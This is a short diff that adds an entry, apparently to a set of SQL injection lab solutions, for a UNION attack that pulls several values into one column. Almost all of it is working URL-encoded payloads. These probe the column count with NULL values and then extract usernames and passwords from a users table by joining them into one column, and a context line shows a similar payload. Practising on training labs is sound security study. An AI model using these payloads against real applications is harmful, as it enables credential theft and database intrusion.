@@ -97,6 +97,28 @@ order by 3--
 ```sh
 '+UNION+SELECT+user,password+from+user--
 ```
+### Lab10: SQL injection UNION attack, retrieving multiple values in a single column
+```sh
+'+UNION+SELECT+NULL,'a'--
+```
+```sh
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+```
+/
+
+```sh
+'+UNION+SELECT+NULL,username||password+FROM+users--
+```
+
+
+
+
+
+
+
+
+
+
 
 
 
